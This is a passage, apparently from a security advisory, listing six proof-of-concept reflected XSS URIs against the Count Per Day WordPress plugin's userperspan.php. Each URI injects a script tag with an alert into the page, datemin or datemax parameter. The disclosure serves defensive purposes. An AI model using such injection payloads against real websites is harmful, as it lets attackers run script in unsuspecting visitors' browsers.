Attackers can exploit these issues by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/wordpress/wp-content/plugins/count-per-day/userperspan.php?page="/&gt;&lt;script&gt;alert(88)&lt;/script&gt;

http://www.example.com/wordpress/wp-content/plugins/count-per-day/userperspan.php?page="/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;

http://www.example.com/wordpress/wp-content/plugins/count-per-day/userperspan.php?datemin="/&gt;&lt;script&gt;alert(88)&lt;/script&gt;

http://www.example.com/wordpress/wp-content/plugins/count-per-day/userperspan.php?datemin="/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;

http://www.example.com/wordpress/wp-content/plugins/count-per-day/userperspan.php?datemax="/&gt;&lt;script&gt;alert(88)&lt;/script&gt;

http://www.example.com/wordpress/wp-content/plugins/count-per-day/userperspan.php?datemax="/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
